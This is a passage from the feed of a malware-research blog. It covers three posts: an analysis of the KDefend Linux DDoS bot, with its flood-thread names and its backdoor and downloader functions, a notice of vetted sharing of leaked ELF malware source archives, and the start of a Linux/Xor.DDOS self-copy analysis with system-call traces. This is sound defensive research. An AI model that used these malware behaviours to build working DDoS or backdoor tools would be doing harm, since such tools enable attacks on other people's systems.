src=https:\/\/lh3.googleusercontent.com\/-NDD0Vc5ydic\/VmCdOsceuOI\/AAAAAAAATzI\/FFPZWAnVUHI\/s580\/002f.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003E*) Noted: \u003C\/i\u003E\u003Cbr\u003E1. Most of operation invoking \u003Ci\u003Eshell \u003C\/i\u003Eor \u003Ci\u003Epipes \u003C\/i\u003Eare driven by using the \u003Ci\u003Estdio.h\u003C\/i\u003E's \u003Ci\u003E\u003Cb\u003Epopen()\u003C\/b\u003E\u003C\/i\u003E and \u003Ci\u003E\u003Cb\u003Epclose()\u003C\/b\u003E\u003C\/i\u003E.\u003Cbr\u003E2. It notices itself as \u003Cb\u003E\u003Ci\u003E\"KDLinux\"\u003C\/i\u003E\u003C\/b\u003E that can be seen in the download process.  \u003Cp\u003EMore information that are interesting to dig: (1) The UDP opened port was meant to \u003Cb\u003Ereceive encoded data\u003C\/b\u003E for being used \u003Cb\u003E\u003Ci\u003E\u003Cfont color=red\u003Eas a bot operational purpose\u003C\/font\u003E\u003C\/i\u003E\u003C\/b\u003E, it has the \u003Cb\u003Edecoder function\u003C\/b\u003E (xref: 0x0804cce9) for that purpose. \u003Cfont color=red\u003E\u003Cb\u003E(2) This is a DDoS'er bot:\u003C\/b\u003E\u003C\/font\u003E the attack vectors is controlled by \u003Cb\u003E\u003Ci\u003EDealwithDDoS()\u003C\/i\u003E\u003C\/b\u003E main function, used are covering some basics and what they call it as \u003Ci\u003E\"Cycle\"\u003C\/i\u003E a custom \u003Cb\u003E\u003Ci\u003ESYN flood attack\u003C\/i\u003E\u003C\/b\u003E (will not going to discuss it \"too\" detail in here), as per listed below: \u003Ci\u003E\u003Cpre\u003E  TcpFloodThread ; send some tcp packets\u003Cbr \/\u003E  NormalSendThread ; socket connecting and flood\u003Cbr \/\u003E  NormalUdpPacketThread ; simple UDP connect and flood\u003Cbr \/\u003E  NormalSynPacketThread ; simulate SYN connection to flood\u003Cbr \/\u003E  NormalDnsSendThread ; connects \u0026 manipulates DNS search..not sure how to apply this\u003Cbr \/\u003E  CycleSynSendThread ; original made SYN attack\u003Cbr \/\u003E  SynSendThread_Old ;; \/\/ it's uncoded\u003C\/pre\u003E\u003C\/i\u003EFurthermore, the \u003Cb\u003E\u003Ci\u003EDealwithDDoS()\u003C\/i\u003E\u003C\/b\u003E is the function that is commonly used in Chinese actor's made \u003Ci\u003EELF flooder malware\u003C\/i\u003E since \u003Cb\u003E\u003Ci\u003ELinux\/Elknot DDoS'er bot\u003C\/i\u003E\u003C\/b\u003E variant era, then \u003Ci\u003E\u003Cb\u003ELinux\/AES.DDoS\u003C\/b\u003E\u003C\/i\u003E and \u003Cb\u003E\u003Ci\u003ELinux\/Mr.Black\u003C\/i\u003E\u003C\/b\u003E are also using this function as their main attack manager function until now. If you follow \u003Ci\u003EELF Workshop Malware Analysis \u003C\/i\u003Ethat I am doing, I made and demonstrated a simple personal \u003Ci\u003EELF analysis system\u003C\/i\u003E that I called it as \"\u003Cb\u003EELF skeleton\u003C\/b\u003E (literally looks like skeleton)\", it has the function scanning to check calls like this, below is the snapshot of its check result on \u003Cb\u003E\u003Ci\u003EDealwithDDoS()\u003C\/i\u003E\u003C\/b\u003E:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-TCYhzclaAqY\/VmCtd-gy_SI\/AAAAAAAATzo\/7kJcmRs_rxo\/s3120\/002g.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-TCYhzclaAqY\/VmCtd-gy_SI\/AAAAAAAATzo\/7kJcmRs_rxo\/s580\/002g.PNG\u003E\u003C\/a\u003E\u003Ci\u003E*) Noted: It shows that the ChinaZ is in the list, but that is actually the \u003Cb\u003EAES.DDOS malware\u003C\/b\u003E they used(parent of Mr.Black for router basis ELF malware).\u003C\/i\u003E \u003Cp\u003ESo what this malware does? It's a \u003Cb\u003E\u003Ci\u003Ebackdoor \u003C\/i\u003E\u003C\/b\u003E(bind\/listen to an opened port, making unnoticed callback to a remote host \u0026 send server's sensitive information), it's a remote \u003Cb\u003E\u003Ci\u003Ebot client for DDOS attack\u003C\/i\u003E\u003C\/b\u003E purpose that receiving encoded commands via connected ports, \u003Cb\u003E\u003Ci\u003E\u003Cfont color=red\u003EA Trojan Downloader\u003C\/font\u003E\u003C\/i\u003E\u003C\/b\u003E too (for updates purpose apparently..but who knows what can be expanded\/applied more in here), and these are the major functionality of this malware.  \u003Cp\u003EIs it meant to be a tool as per stated in the disclaimer? \u003Cb\u003ENo way.\u003C\/b\u003E The way it decodes commands, the specific flood used, the backdoor (homing and listening to open port) functions  and the trojan-like downloader part, altogether doesn't show any of good tool specification.  \u003Cp\u003E\u003Ch2\u003EWho's the possible actor of this incident?\u003C\/h2\u003E \u003Cp\u003ECould this be \u003Ci\u003Eanother\u003C\/i\u003E \u003Cb\u003EChinaZ\u003C\/b\u003E's new malware experiment? Why not. Judging by their development MO (leftover unwanted function uncoded instead eliminated them), copy pasting known other China ELF malware's functions, networking used and some of their typical typo, ASCII \u0026 symbols \"china brand\" are matched to some incidents of ChinaZ actors, we have strong possibility for it.  \u003Cp\u003EThe ChinaZ group is also the most aggressive one in the market in research and development for the new trojan ddoser, they made new codes, buying other chinese ELF sources, contacting several C coders to combine functionality to make a better \u003Cb\u003E\u003Ci\u003EELF bruter trojans\u003C\/i\u003E\u003C\/b\u003E, like this.  \u003Cp\u003E\u003Ch2\u003EEpilogue: A DDoS'er with \"Disclaimer\" vs \"Rule of Engagement\"\u003C\/h2\u003E \u003Cp\u003EWe think the message used in \"Disclaimer\" part is an important aspect here. The coder is trying to bend the responsibility of what he coded by writing few lines to dodge from responsibility. This smells just as the same excuse used as previous ChinaZ coder spotted in the GitHub [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/06\/the-elf-chinaz-reloaded.html\"\u003Elink\u003C\/a\u003E]. Below are the opinions from our team mates due to this \"Disclaimer issue\" that I think it is worth to share as opinions, and please feel free to tweet us your opinion to be added in this post.   \u003Cp\u003E\u003Ci\u003E\"I believe in \u003Cb\u003ERoE \u003C\/b\u003E- \u003Ci\u003E\"Rules of engagement\"\u003C\/i\u003E. It is super bad violation of \u003Cb\u003ERoE \u003C\/b\u003Eto use these tools against something you do not own, or have well and just cause to discharge against. The internet is not having a certain rules, just like a battlefield, and everyone is armed, or can potentially become armed. So discipline is utterly paramount to having a stable and peaceful internet. It is a major violation of RoE to use these tools against something you do not own or don't have a well and just cause to do so.\"\u003C\/i\u003E \u003Cb\u003E@yinettesys\u003C\/b\u003E \u003Cp\u003E\u003Ci\u003E\"Creating illegal tools remains illegal, even if you write \"only for legal use\". No matter \"un-harmful\" it is stated. This program is clearly \u003Cb\u003E\u003Ci\u003Emeant to harm \u003C\/i\u003E\u003C\/b\u003Eother host in internet. It's the same to forbid the creation of bombs but then normal people are creating some for \"research use. This disclaimer is used by malware authors writing to dodge laws. \"Don't use for illegal things\"..words is bailing out and tacking the backdoor with \"use only for legal purposes\" which is never making any sense. It's just like you are admitting there that you actually know that actions performed by this tool is illegal but spread it anyway with making it public aka releasing it, and then a bad person using it..\"\u003C\/i\u003E \u003Cb\u003E@wirehack7\u003C\/b\u003E \u003Cp\u003E\u003Ci\u003E\"The similar disclaimer for many DDoS tools is a \u003Ci\u003Etrend \u003C\/i\u003Enow, specially in the \u003Ci\u003EDDoS related services or threat\u003C\/i\u003E. And this malware coder is seeing how that \u003Ci\u003Edisclaimer method\u003C\/i\u003E is effective and just utilizing it. Hopefully our law can see how dangerous this tool it is by function explained in this analysis, and see by the real penetration\/infection\/attack that is currently distributed. There is no legality on its scheme. It is a \u003Cb\u003E\u003Ci\u003Emalware\u003C\/i\u003E\u003C\/b\u003E with its complete malicious functions intact, and the malware coder has his own responsibility to build such aggressive software.\"\u003C\/i\u003E \u003Cb\u003E@unixfreaxjp\u003C\/b\u003E \u003Cp\u003E\u003Ch2\u003ELatest Memo:\u003C\/h2\u003E \u003Cp\u003EAll analysis was done (as usual) in \u003Ca href=\"http:\/\/freebsd.org\"\u003EFreeBSD\u003C\/a\u003E unix shell with \u003Ca href=\"http:\/\/radare.org\"\u003Eradare\u003C\/a\u003E, only ELF skeleton that's using different scheme. Thank's to help\/support from MMD ELF team mates, MMD folks and all malware fighter-brotherhood for motivating us to keep on posting.  \u003Cp\u003E\u003Ch2\u003EFollow up:\u003C\/h2\u003E\u003Cp\u003E\u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/EmergingThreats\"\u003E@EmergingThreats\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/node5\"\u003E@node5\u003C\/a\u003E friends, I am sending you all traffic pcaps of this new \u0026quot;KDefend\u0026quot; \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/botnet?src=hash\"\u003E#botnet\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/HaBZ875RpU\"\u003Ehttps:\/\/t.co\/HaBZ875RpU\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/672639665438986240\"\u003EDecember 4, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E I\u0026#39;m opening a new repository for Linux\/KDefend in \u003Ca href=\"https:\/\/t.co\/X5acf609QS\"\u003Ehttps:\/\/t.co\/X5acf609QS\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/n0aujyLlNQ\"\u003Ehttps:\/\/t.co\/n0aujyLlNQ\u003C\/a\u003E\u0026#10;cc: \u003Ca href=\"https:\/\/twitter.com\/Xylit0l\"\u003E@Xylit0l\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hFireF0X\"\u003E@hFireF0X\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/672547869983772673\"\u003EDecember 3, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-cards=\"hidden\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/node5\"\u003E@node5\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/EmergingThreats\"\u003E@EmergingThreats\u003C\/a\u003E ET sig going out today: \u003Ca href=\"https:\/\/t.co\/uKaMEhRMZN\"\u003Ehttps:\/\/t.co\/uKaMEhRMZN\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; Travis Green (@travisbgreen) \u003Ca href=\"https:\/\/twitter.com\/travisbgreen\/status\/672803273846292481\"\u003EDecember 4, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EPlease stay safe! \u003Cb\u003E#MalwareMustDie!\u003C\/b\u003E"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/3192282181194922209\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/12\/mmd-0045-2015-kdefend-new-elf-threat.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3192282181194922209"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3192282181194922209"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/12\/mmd-0045-2015-kdefend-new-elf-threat.html","title":"MMD-0045-2015 - KDefend: a new ELF threat with a disclaimer"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-czRbJviqXSM\/VmByUhZf_KI\/AAAAAAAATxk\/VrcuxWrG0fM\/s72-c\/001a.png","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-5992206001712983892"},"published":{"$t":"2015-11-22T22:43:00.000-08:00"},"updated":{"$t":"2016-04-30T07:39:04.629-07:00"},"title":{"type":"text","$t":"MMD-0044-2015 - Source code disclosure of bunch of SkiDDoS ELF malware"},"content":{"type":"html","$t":"\u003Cb\u003E\u003Cp\u003E\u003Cfont color=red\u003EThis sharing has been closed due to time limit (60days) - Thank you\u003C\/font\u003E\u003C\/b\u003E \u003Cp\u003EMalwareMustDie,NPO is a white-hat non-profit security research workgroup launched in August 2012 for\/by security professionals and malware researchers gathered to form a work-flow to reduce malware infection in internet. In this opportunity I, hereby, on behalf of the active projects and field operational ELF malware researches, am sharing first series of ELF malware source code collected in action and secured in 2015, wrapped in a form of RAR(version 5) password-archive, with its further additional.  \u003Cp\u003EAs per internally decided, we are now having new scheme of sharing malcodes, to reduce the unwanted access to the archive, the file was uploaded to the virus total with the hash of: \u003Cpre\u003ESHA256 (ELF-malware-in-C-leaks.rar) \u003Cbr \/\u003E43a383bb8b2fa799a0a06a585c52e91f6ea1c877bba12c21e691e32a99f9adf4\u003C\/pre\u003E The password has a high character count and the archive was built in a way to avoid brute. You can receive the password by commenting this post with informing your current active email address and the detail of which \u003Cb\u003Eknown\u003C\/b\u003E security entity you are actually working with (or anti-viruses entities, or law enforcement research agencies, or government related interet security incident response \u0026 research teams, i.e: SOC\/CERT\/CSIRT, as entities allowed t receive these code) and the comment will not be published to the public (feel free to test it first).   \u003Cp\u003EWe will check each request and not sharing the password to unknown individual\/independent contacts without clear confirmed information\/identification of who they are. These are malware source codes and not malware samples nor toys to play with, it is a very dangerous material to be passed to wrong hands. Please bear with the slowness in response due to the check process and due the fact that we are a non-profit organization, with limited resources and only active in our spare time.   \u003Cp\u003EThe archive will stay online for two months, after that period we won't share it anymore and will delete our files. Don't request the code after this time has passed. We are not responsible to any of damage that will occur due to the misuse of the shared material, please read our Legal Disclaimer and Sharing Guide for more information--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/p\/the-rule-to-share-malicious-codes-we.html\"\u003Ehere\u003C\/a\u003E]  \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EI closed the sharing for \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E source code case: \u003Ca href=\"https:\/\/t.co\/KpMLJBMqmK\"\u003Ehttps:\/\/t.co\/KpMLJBMqmK\u003C\/a\u003E\u0026#10;We succeeded sharing to AntiVirus and 132 other contacts.Ty\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/691379350118109184\"\u003EJanuary 24, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EWhat can be achieved by these source code are: \u003Cpre\u003E- better mitigation of the leaked ELF botnet specific type\/variants\u003Cbr \/\u003E- several hard coded leads for prevention of DDOS attack methodology used to research\u003Cbr \/\u003E- several exploitation research that can be produced and implemented by each ELF botnet\u003Cbr \/\u003E- you may publish research of these code(s), on a condition: mention us, #MalwareMustDie.\u003Cbr \/\u003E  (we did the hard part in achieving, collecting, selecting, testing and sharing -\u003Cbr \/\u003E   these codes, for free)\u003C\/pre\u003E \u003Cp\u003EBelow is the snapshot of the original archive, that you will see after you open it correctly. \u003Cbr\u003EThe total codes shared in this part is 21 (twenty one) source code, all in C except one bonus in html.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-v-g_LP5ZAaU\/VlK0T4QTBWI\/AAAAAAAATuw\/Z4hclpmNQCk\/s4400\/leaked.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-v-g_LP5ZAaU\/VlK0T4QTBWI\/AAAAAAAATuw\/Z4hclpmNQCk\/s400\/leaked.PNG\u003E\u003C\/a\u003E \u003Cp\u003EI think I will see how this first part of the new scheme of sharing goes with studying the negative aspects for it, if things go well, for the next part (part 2 of sharing) will be focusing on the share on source codes for the ELF threats codes that is collected from some \"specific\" regions :-)   \u003Ca name=add\u003E\u003Cp\u003E\u003Ch2\u003EAdditional ELF malware source code..\u003C\/h2\u003E\u003Cp\u003EAs per mentioned below:\u003Cbr\u003E\u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-fYIFxqWsAD8\/VlmpN8RtBqI\/AAAAAAAATvg\/pPYfJQY829U\/s3120\/share2.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-fYIFxqWsAD8\/VlmpN8RtBqI\/AAAAAAAATvg\/pPYfJQY829U\/s580\/share2.png\u003E\u003C\/a\u003E\u003Cbr\u003EThis is the additional's share with the same method \u0026 the arvhive was uploaded to virus total with hash: \u003Cpre\u003ESHA256 (mmd-extra.7z)\u003Cbr \/\u003E9464b4443d4ce19977d774bddf4b1987c4e090f1ac4ccb80d534e0e593a2b41c\u003C\/pre\u003Eit's using a different long-password, you can ask for it by the same scheme.  \u003Cp\u003EPS: This (below) action will be executed as response of a further attacks from the shared source codes malware bad actors :-) \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EGo ahead \u003Ca href=\"https:\/\/twitter.com\/hashtag\/DDOS?src=hash\"\u003E#DDOS\u003C\/a\u003E us more \u0026amp; we put EACH \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E BOTNET \u003Ca href=\"https:\/\/twitter.com\/hashtag\/EXPLOIT?src=hash\"\u003E#EXPLOIT\u003C\/a\u003E to be uploaded in \u003Ca href=\"https:\/\/twitter.com\/hashtag\/METASPLOIT?src=hash\"\u003E#METASPLOIT\u003C\/a\u003E soon :)\u0026#10;\u003Ca href=\"https:\/\/twitter.com\/hashtag\/WeMeantWhatWeSaid?src=hash\"\u003E#WeMeantWhatWeSaid\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/qLeQIXTDxf\"\u003Ehttps:\/\/t.co\/qLeQIXTDxf\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/670596015741935616\"\u003ENovember 28, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E\u003Cp\u003ECheers from #MalwareMustDie"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/5992206001712983892\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/11\/mmd-0044-2015-source-code-disclosure.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/5992206001712983892"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/5992206001712983892"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/11\/mmd-0044-2015-source-code-disclosure.html","title":"MMD-0044-2015 - Source code disclosure of bunch of SkiDDoS ELF malware"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-v-g_LP5ZAaU\/VlK0T4QTBWI\/AAAAAAAATuw\/Z4hclpmNQCk\/s72-c\/leaked.PNG","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-5381212088536202125"},"published":{"$t":"2015-09-17T08:18:00.003-07:00"},"updated":{"$t":"2015-09-19T01:24:47.498-07:00"},"title":{"type":"text","$t":"MMD-0043-2015 - Polymorphic in ELF malware: Linux\/Xor.DDOS"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003E\u003Ci\u003EA share of knowledge I have, hopefully to make internet safer - @unixfreaxjp\u003C\/i\u003E \u003Cp\u003EThe threat of \u003Cb\u003ELinux\/XOR.DDoS\u003C\/b\u003E, a China-made ELF backdoor \u0026 ddoser malware, a rather specific threat compares to other Chinese ELF ddosers, and it's still on going. I just received a good question (from I assumed from a victim of infection or a researcher) about why the found malware binary is not the same as what was firstly executed one. Well, this writing is short and covering the answer for the asked question only. But, the information maybe important for the mitigation and detection, and also various methodology I use for the sharing to other NIX mates, so I write this post with three processes I conduct to every ELF malware investigation: in \u003Ci\u003Ereversing\u003C\/i\u003E, \u003Ci\u003Edebugging \u003C\/i\u003Eand \u003Ci\u003Eforensics \u003C\/i\u003Eways. Please bear with the poor english since I had few time to check, or to the lack of the explanation.  \u003Cp\u003E\u003Ci\u003E\u003Ci\u003EPolymorphic \u003C\/i\u003Eis a behavior of malware during self-reproduction constantly changes (\"morphs\") the file characteristic (size, hash, etc), and it may not be the same with the previous copy or as previous pre-infection state.\u003C\/i\u003E The goal of this changes is \u003Cb\u003Eto makes it difficult\u003C\/b\u003E for signature-based antivirus software programs to recognize and detect the polymorphed malware.  \u003Cp\u003E\u003Ci\u003EPolymorphic method\u003C\/i\u003E in malware is an usual practise in windows malware. In UNIX malware maybe it is not as commonly heard as in Windows; but since the nature of NIX malware are coming from networking, either to be \"extracted\" from encoder\/infector files, downloaded or dropped by other malware from the beginning, so..I guess we have many hashes by default. But in this post, we are actually dealing with a polymorphic behavior malware just like ones infecting Windows during the self-copy method.. so I guess it is worth to write a bit.  \u003Cp\u003EThe reported case was a real infection, a case of known gang\/crooks, I am allowed to post the the attack log as per following:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Dn4q7pJLnSo\/VfrNgfDM6QI\/AAAAAAAATO0\/8wKBziGadcE\/s3120\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Dn4q7pJLnSo\/VfrNgfDM6QI\/AAAAAAAATO0\/8wKBziGadcE\/s580\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003EYes, it is a recent attack, please block the IP addresses.  \u003Cp\u003EThe above log is typical \u003Cb\u003ELinux\/Xor.DDOS\u003C\/b\u003E \u003Cfont color=red\u003E\u003Cb\u003Ehostasa.org\u003C\/b\u003E\u003C\/font\u003E ssh brute attack pattern. I announced the case not so long ago here (different cases, same attacker)--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/06\/mmd-0033-2015-linuxxorddos-infection_23.html\"\u003Elink\u003C\/a\u003E] and the recent incident was reported too in here--\u003E[\u003Ca href=\"http:\/\/bit.ly\/1iuxQuY\"\u003Elink\u003C\/a\u003E]. I uploaded this ELF malware sample into \u003Cb\u003EVirus Total\u003C\/b\u003E w\/the link is here--\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/8d25feed690c1381f70018f5b905efbc9d8901098371cdeb8f32aa4d358210c7\/analysis\/1442501628\/\"\u003Elink\u003C\/a\u003E].  \u003Cp\u003E\u003Ch2\u003EPolymorphic PoC\u003C\/h2\u003E \u003Cp\u003EWhen \u003Cb\u003ELinux\/XOR.DDoS\u003C\/b\u003E malware was executed, it will come to the stage that it seeks the place to self-copy it self, in my case the linux system call can show us the effort to write file like: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eopen(\"\/usr\/bin\/lgjgjmkkgd\", O_WRONLY|O_CREAT, 0777) ; depends, in mine is -1 EACCES (Permission denied)\u003Cbr \/\u003Eopen(\"\/bin\/lgjgjmkkgd\", O_WRONLY|O_CREAT, 0777)     ; depends, in mine is -1 EACCES (Permission denied)\u003Cbr \/\u003E\u003C\/pre\u003EIn a well-hardened linux system and if the malware is not executed as root you should see the same result as per pasted above. And that time the malware will aim to the only their favorite heavenly place to copy: \u003Cb\u003E\/tmp\u003C\/b\u003E : \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eopen(\"\/XOR.DDOS.SAMPLE\", O_RDONLY)      ; initial exec malware open itself\u003Cbr \/\u003Elseek(3, 0, SEEK_SET);                  ; set LSET to OFFSET to READ\u003Cbr \/\u003Eopen(\"\/tmp\/lgjgjmkkgd\", O_WRONLY|O_CREAT, 0777); open self-copy target w\/perm 777\u003Cbr \/\u003Eread(3, \"\\177ELF\\1\\1\\1\\0\\..\");          ; read the malware bin\u003Cbr \/\u003Elseek(4, 0, SEEK_SET)                  ; set LSET to OFFSET to WRITE\u003Cbr \/\u003E14878 read(3, \"\\177ELF\\1\\1\\1\\0\\…       ; copy process read..\u003Cbr \/\u003E14878 write(4, \"\\177ELF\\1\\1\\1\\0\\…      ; copy process write\u003C\/pre\u003E \u003Cp\u003EBy reverse engineering the ELF malware, after seeking for a while, the assembly procedure below is responsible for the above operation: (the bigger picture click--\u003E\u003Ca href=\"http:\/\/imgur.com\/WDzFIvh\"\u003E\u003ETHIS\u003C\/a\u003E )\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1D2mHJdwT_s\/VfrNguoofAI\/AAAAAAAATO4\/IJqLEnRnV0A\/s2120\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1D2mHJdwT_s\/VfrNguoofAI\/AAAAAAAATO4\/IJqLEnRnV0A\/s580\/003.png\u003E\u003Cbr\u003E\u003C\/a\u003E\u003Cbr\u003EYou can see the cascade of jumps during each error that might occur until it ends up to the accessed one for the self-copy purpose, starting from \u003Cb\u003E\/usr\/bin\u003C\/b\u003E to \u003Cb\u003E\/bin\u003C\/b\u003E , and in my case it is ended with \u003Cb\u003E\/tmp\/[randomname]\u003C\/b\u003E. The filename is random and the full path with the directory aimed is to be \"fired\" via an original API to execute the \u003Cb\u003Eexecve()\u003C\/b\u003E, but we will go to this topic later on.  \u003Cp\u003EIn Linux memory forensics the blob data copied can be seen clearly with some beautify effort, a good old \u003Ci\u003Ehexdump\u003C\/i\u003E is still a favorite in dealing with raw hex data:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E## Copy process illustration (read and write of copy process) in the end of file:\u003Cbr \/\u003E[...]\u003Cbr \/\u003E00098bd0  6d 65 00 5f 64 6c 5f 6d  61 70 5f 6f 62 6a 65 63  |me._dl_map_objec|\u003Cbr \/\u003E00098be0  74 5f 64 65 70 73 00 5f  6e 6c 5f 43 5f 4c 43 5f  |t_deps._nl_C_LC_|\u003Cbr \/\u003E00098bf0  49 44 45 4e 54 49 46 49  43 41 54 49 4f 4e 00 5f  |IDENTIFICATION._|\u003Cbr \/\u003E00098c00  64 6c 5f 6e 73 00 5f 6e  6c 5f 6c 6f 61 64 5f 6c  |dl_ns._nl_load_l|\u003Cbr \/\u003E00098c10  6f 63 61 6c 65 5f 66 72  6f 6d 5f 61 72 63 68 69  |ocale_from_archi|\u003Cbr \/\u003E00098c20  76 65 00 77 63 74 72 61  6e 73 00                 |ve.wctrans.|\u003Cbr \/\u003E00098c2b\u003Cbr \/\u003E\u003C\/pre\u003EAnd the copy process was ended gracefully, as per debug check shows in the system call below: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eread(3, \"\", 4096):   ; EO\/termination w\/no space\u003Cbr \/\u003Eclose(3);            ; end of copy (reading)\u003Cbr \/\u003Eclose(4);            ; end of copy (writing)\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003ENothing so special about operation above, but it is related to the next steps, let's go forward.. Now, we can see up to here that the malware was self copied! But why the file gets different?\u003Cbr\u003EThe next system's call showing the effort to open the written file afterward with flag to write.. What's going 